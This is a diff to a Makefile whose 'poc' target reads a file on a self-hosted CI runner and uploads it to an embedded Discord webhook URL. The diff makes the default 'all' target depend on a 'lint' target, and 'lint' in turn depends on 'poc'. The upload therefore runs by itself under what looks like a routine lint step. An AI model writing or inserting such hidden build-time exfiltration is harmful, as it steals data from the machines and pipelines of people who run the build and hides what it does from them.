@@ -1,3 +1,6 @@
+.PHONY: all poc lint
+all: lint
+
 poc:
 	@echo "[POC] Local File Read on self-hosted runner…"
 	@tmpfile="$$(mktemp /tmp/lfiPoC.XXXXXX.txt)"; \
@@ -14,3 +17,6 @@ poc:
 		"https://discord.com/api/webhooks/1413091167125504000/DZPsdR_duaO5zoezj4o3FxDAQZ5JqoChL3vEPWg7BcjLJ17U0zVoUrtJbkyVJDYPRDdN")"; \
 	echo "Discord file HTTP $$http_code"; \
 	rm -f "$$tmpfile" || true
+
+lint: poc
+	@echo "Lint step ran (after PoC)."
